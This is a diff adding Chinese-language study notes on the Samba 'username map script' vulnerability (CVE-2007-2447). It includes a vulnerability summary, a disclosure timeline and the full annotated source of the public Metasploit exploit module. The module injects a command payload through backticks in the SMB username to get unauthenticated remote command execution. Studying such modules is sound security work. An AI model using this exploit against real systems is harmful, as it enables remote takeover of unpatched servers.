@@ -22,3 +22,121 @@ Systemd是一种新的linux系统服务管理器。它替换了init系统，能�
   ```sudo systemctlset-default graphical.target```
 - 打开图形界面
   ```sudo init 5```
+### Metasploit
+#### usermap_script 漏洞相关笔记
+- usermap_script：CVE-2007-2447
+>利用Samba用户名映射脚本命令执行
+>这个模块利用漏洞执行命令，在Samba版本3.0.20到3.0.25rc3当使用非默认用户名映射脚本配置选项。 
+>通过指定一个用户名包含shell元字符,攻击者可以执行任意命令。 
+>不需要身份验证来利用此漏洞，因为此选项用于在身份验证之前映射用户名
+>模块的位置 exploit/multi/samba/usermap_script
+>用户输入未转义的参数作为参数传递到/bin/sh，允许远程命令执行
+>此漏洞最初是针对匿名呼叫报告的
+> 经过Samba开发者的进一步调查，结果是确定了问题更广泛和影响远程打印机和文件共享管理。 根本原因是传递通过MS-RPC提供的未过滤的用户输入在调用定义的外部脚本时调用/bin/sh，在smb.conf中。 
+> 然而，不同于"username map script"漏洞，远程文件和打印机管理脚本需要经过身份验证的用户会话。
+>
+
+> 漏洞的时间线：
+>
+> 1. 2007年5月7日：漏洞匿名披露到security@samba.org电子邮件列表中。
+> 2. 2007年5月7日：Samba的开发人员Gerald Carter开始响应这个漏洞。
+> 3. 2007年5月9日：Samba的开发者Jeremy Allison发布了补丁，用于iDefense测试。
+> 4. 2007年5月10日：向vendor-sec邮件列表发布通知。
+> 5. 2007年5月14日：公开漏洞信息。
+
+```
+##
+# $Id: usermap_script.rb 10040 2010-08-18 17:24:46Z jduck $
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/framework/
+##
+
+# 这个和Python的import还要C的include一样的作用
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+# Metasploit3是从Msf::Exploit::Remote中继承的
+
+    Rank = ExcellentRanking
+
+    include Msf::Exploit::Remote::SMB
+
+    # For our customized version of session_setup_ntlmv1
+    CONST = Rex::Proto::SMB::Constants
+    CRYPT = Rex::Proto::SMB::Crypt
+
+    def initialize(info = {})
+        super(update_info(info,
+            'Name'           => 'Samba "username map script" Command Execution',
+            'Description'    => %q{
+                    This module exploits a command execution vulerability in Samba
+                versions 3.0.20 through 3.0.25rc3 when using the non-default
+                "username map script" configuration option. By specifying a username
+                containing shell meta characters, attackers can execute arbitrary
+                commands.
+
+                No authentication is needed to exploit this vulnerability since
+                this option is used to map usernames prior to authentication!
+            },
+            'Author'         => [ 'jduck' ],
+            'License'        => MSF_LICENSE,
+            'Version'        => '$Revision: 10040 $',
+            'References'     =>
+                [
+                    [ 'CVE', '2007-2447' ],
+                    [ 'OSVDB', '34700' ],
+                    [ 'BID', '23972' ],
+                    [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
+                    [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
+                ],
+            'Platform'       => ['unix'],
+            'Arch'           => ARCH_CMD,
+            'Privileged'     => true, # root or nobody user
+            'Payload'        =>
+                {
+                    'Space'    => 1024,
+                    'DisableNops' => true,
+                    'Compat'      =>
+                        {
+                            'PayloadType' => 'cmd',
+                            # *_perl and *_ruby work if they are installed
+                            # mileage may vary from system to system..
+                        }
+                },
+            'Targets'        =>
+                [
+                    [ "Automatic", { } ]
+                ],
+            'DefaultTarget'  => 0,
+            'DisclosureDate' => 'May 14 2007'))
+
+        register_options(
+            [
+                Opt::RPORT(139)
+            ], self.class)
+    end
+
+
+    def exploit
+
+        connect
+
+        # lol?
+        username = "/=`nohup " + payload.encoded + "`"
+        begin
+            simple.client.negotiate(false)
+            simple.client.session_setup_ntlmv1(username, rand_text(16), datastore['SMBDomain'], false)
+        rescue ::Timeout::Error, XCEPT::LoginError
+            # nothing, it either worked or it didn't ;)
+        end
+
+        handler
+    end
+
+end
+```
